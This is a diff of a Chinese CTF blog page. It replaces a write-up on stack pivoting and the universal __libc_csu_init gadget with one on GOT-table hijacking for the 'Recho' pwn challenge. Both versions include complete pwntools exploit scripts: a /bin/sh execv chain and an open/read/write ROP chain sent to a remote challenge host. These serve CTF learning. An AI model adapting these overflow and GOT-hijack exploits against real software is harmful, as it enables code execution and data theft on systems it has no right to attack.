@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="栈转移原理与通用garget的使用, 矢坕个人博客">
+    <meta name="keywords" content="got表劫持实战讲解, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>栈转移原理与通用garget的使用 | 矢坕个人博客</title>
+    <title>got表劫持实战讲解 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">栈转移原理与通用garget的使用</h1>
+                    <h1 class="description center-align post-title">got表劫持实战讲解</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
-                                <span class="chip bg-color">pwn原理讲解 pwn_write_up</span>
+                            <a href="/tags/pwn-write-up-pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                <span class="chip bg-color">pwn-write-up pwn原理讲解</span>
                             </a>
                         
                     </div>
@@ -447,28 +447,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-28
+                    2023-01-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-01-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    605
+                    960
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -486,33 +486,44 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="栈转移原理与通用rop的使用"><a href="#栈转移原理与通用rop的使用" class="headerlink" title="栈转移原理与通用rop的使用"></a>栈转移原理与通用rop的使用</h1><p>此题下载链接：<br><a href="/download/advanced">点击下载</a><br>这里我们通过一题pwn题边解边说：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/1.png"><br>可以看到，这题讲解示范没有开任何保护。<br>拖入ida查看：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/2.png"><br>虽然打印出来了execv的地址和system的地址，但不知道为什么和~~ 实际差挺多的  ~~……如下：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/3.png"><br>查看vul函数发现有溢出点但是字节有限只能溢出24个字节，而此题没有现成的system或execv函数可用，直接溢出并不现实<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/4.png"></p>
-<h3 id="栈转移原理"><a href="#栈转移原理" class="headerlink" title="栈转移原理"></a>栈转移原理</h3><p>现在介绍一个新的方法：<strong>栈转移</strong><br>当碰到这种题目时，因为溢出字节不够，要转移到别的栈段上运行已准备好的rop<br>栈是由rbp和rsp决定的，尤其是后者rsp在哪，栈就在哪。因此，我们只需要想办法把rsp指针转移到我们需要的地方即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>实际方法用leave ret指令可以做到<br>我们知道leave指令相当于</p>
-<pre class="line-numbers language-none"><code class="language-none">move rsp, rbp
-pop  rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>ret指令相当于：</p>
-<pre class="line-numbers language-none"><code class="language-none">pop rip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>因此将rbp的值先覆盖成目标地址，利用函数自带的leave指令先将rbp控制，接下另一段leave ret的garget的地址就可以实现rsp的控制实现栈转移，至于转移后rbp的值并不重要<br>leave;ret;地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/5.png"></p>
-<h3 id="通用garget原理"><a href="#通用garget原理" class="headerlink" title="通用garget原理"></a>通用garget原理</h3><p>已经把栈转移到了grobe_buf去了，接下来设置该区域的rop链，我们用通用garget<br>我们点开_libc_csu_init这个函数<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/7.png"><br>可以发现这里的garget是不是很齐全，只要调用了这里几乎哪里都能call，这里分为两个garget分别记下地址<br>这里说一下怎么查看execv函数got表地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/9.png"><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/10.png"><br>接下来上exp：</p>
+                <h1 id="攻防世界Recho"><a href="#攻防世界Recho" class="headerlink" title="攻防世界Recho"></a>攻防世界Recho</h1><p>对于这题有两个知识点要讲1、got表劫持2、pwntools的shutdown用法场景<br>先checksec一下：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/1.png"><br>开了NX保护机制看起来还行，但作为进阶pwn应该不会太简单。<br>拖进IDA查看：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/2.png"><br>代码不会花里胡哨，没有调用杂七杂八的函数，同样没有后门函数。<br>这里溢出点非常简单，只要读入nptr，**v7 &#x3D; atoi(nptr)**会自动将读入的nptr进行整型转换，atoi函数自行去网上搜，这里不作过多赘述。<br><strong>v6 &#x3D; read(0, buf, v7)</strong>;只要v7足够大，那么buf就可以无限读入实现溢出。但难点在于如何结束循环，因为不管怎样read只要有读入返回值就一定不会是0。</p>
+<h2 id="0x01-pwntools-shutdown方法"><a href="#0x01-pwntools-shutdown方法" class="headerlink" title="0x01 pwntools shutdown方法"></a>0x01 pwntools shutdown方法</h2><p>如果是在linux终端上直接运行，我们可以用Ctrl+D，然而，pwn远程，就无法处理这种信号。幸运的是pwntools提供了一个shutdown功能，<strong>该功能可以关闭流，如果我们关闭输入流,这个循环就结束了。但是我们别想再次ROP到主函数获取输入，因为关闭后就不能打开，除非重新运行</strong>，那么之前的工作不都白费了吗。因此，我们必须一次性完成所有操作。<br>一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system也可以用系统调用,而对于有些系统则不行，<strong>并且这里也没有给出system函数，没有泄露调用不了</strong>，因此，我们这里<strong>不再geshell，我们直接读取flag，然后打印出来</strong>。<del>这样rop链会非常的长……</del></p>
+<h2 id="0x02-got表劫持"><a href="#0x02-got表劫持" class="headerlink" title="0x02 got表劫持"></a>0x02 got表劫持</h2><p>为了实现以上想法我们想要构造这样的一条链：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span>READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>因为没有open函数，我们又知道open函数是由syscall调用的，调用号为2，且给出的函数中alarm没有用它也是被syscall调用的于是我们想到改写alarm函数的got表保存的地址使它指向syscall<br>我们用pwndbg查看一下alarm函数的反汇编代码：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/3.png"><br>那个endbr64不用管他，函数从它下面开始，也就是syscall离alarm调用处偏移了5，我们要将这个5加上去，<strong>（这里是经验快记）</strong>所以我们要找一个<strong>add [寄存器]，寄存器</strong> 类型的garget<br>用ropper查找：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/4.png"><br>我们选择这个garget，因为rdi比较常见且它比较简单操作<br>搜索我们要的其他garget：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/5.png"><br>这里都有<br>flag字符串可以在字符串窗口找到，但要设置下显示长度要不然可能找不到<br>先右击任意位置打开选择setup，将下面那个设置成4，那个是最小长度显示<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/6.png"><br>上exp：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./advanced'</span><span class="token punctuation">)</span>
-payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011fb</span><span class="token punctuation">)</span><span class="token comment">#leave ret的地址</span>
-payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token comment">#将/bin/sh\x00输入grobe_buf中</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40133a</span><span class="token punctuation">)</span><span class="token comment">#通用garget pop部分</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#rbx</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#rbp</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token comment">#将/bin/sh的地址给r12，r12后会给rdi</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r13</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r14 这两个值看调用函数原型的要求来定</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x403ff8</span><span class="token punctuation">)</span><span class="token comment">#execv函数在got表的真实地址</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x401320</span><span class="token punctuation">)</span><span class="token comment">#通用garget call部分</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'global:'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>结束战斗：<del>（由于是本地做题没有flag）</del><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/11.png"></p>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">55003</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./recho"</span><span class="token punctuation">)</span>
+read_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
+write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
+alarm_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>
+alarm_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>
+flag_addr<span class="token operator">=</span><span class="token number">0x0601058</span>
+pop_rax<span class="token operator">=</span><span class="token number">0x04006fc</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x04008a3</span>
+pop_rdx<span class="token operator">=</span><span class="token number">0x04006fe</span>
+pop_rsi_r15<span class="token operator">=</span><span class="token number">0x04008a1</span>
+add_rdi<span class="token operator">=</span><span class="token number">0x040070d</span>
+bss_addr<span class="token operator">=</span><span class="token number">0x0601060</span><span class="token comment">#bss段具有可读写权限，将flag存这</span>
+<span class="token comment">#溢出0x38覆盖至rbp，并改写alarm的got表存储的地址</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rdi<span class="token punctuation">)</span>
+<span class="token comment">#构造open函数</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span>
+<span class="token comment">#构造read函数，open以后，fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。如果特殊，</span>
+<span class="token comment">#具体看调试结果</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
+<span class="token comment">#构造write函数，把读取到的flag打印出来</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得shell：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/7.png"></p>
 
                 
             </div>
@@ -539,7 +550,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/">http://airunfive.github.io/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
+                    <a href="http://airunfive.github.io/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/">http://airunfive.github.io/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -577,8 +588,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
-                                    <span class="chip bg-color">pwn原理讲解 pwn_write_up</span>
+                                <a href="/tags/pwn-write-up-pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                    <span class="chip bg-color">pwn-write-up pwn原理讲解</span>
                                 </a>
                             
                         </div>
@@ -748,17 +759,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/28/guess-num/">
+                <a href="/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="guess_num">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="got表劫持实战讲解">
                         
-                        <span class="card-title">guess_num</span>
+                        <span class="card-title">got表劫持实战讲解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -768,9 +780,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -779,11 +791,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/pwn-write-up-pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">pwn-write-up pwn原理讲解</span>
                     </a>
                     
                 </div>
@@ -797,13 +810,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/27/CGfsb-wp/">
+                <a href="/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CGfsb_wp">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="攻防世界——实时数据监测">
                         
-                        <span class="card-title">CGfsb_wp</span>
+                        <span class="card-title">攻防世界——实时数据监测</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -814,7 +827,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-10
                             </span>
                         <span class="publish-author">
                             
